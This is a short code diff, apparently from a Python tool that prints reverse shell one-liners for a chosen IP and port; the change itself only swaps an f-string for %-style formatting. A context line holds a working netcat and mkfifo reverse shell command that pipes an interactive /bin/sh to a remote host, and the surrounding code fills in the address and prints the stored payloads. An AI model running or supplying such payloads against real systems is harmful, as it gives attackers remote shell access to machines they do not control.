@@ -35,5 +35,5 @@ rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc <ip> <port> >/tmp/f""",
             print(cls._doc[argv[2]].replace("<ip>", ip).replace("<port>", str(port)))
         else:
             for key in cls._doc:
-                print(f'[{key}]')
+                print('[%s]' % key)
                 print(cls._doc[key].replace("<ip>", ip).replace("<port>", str(port)))
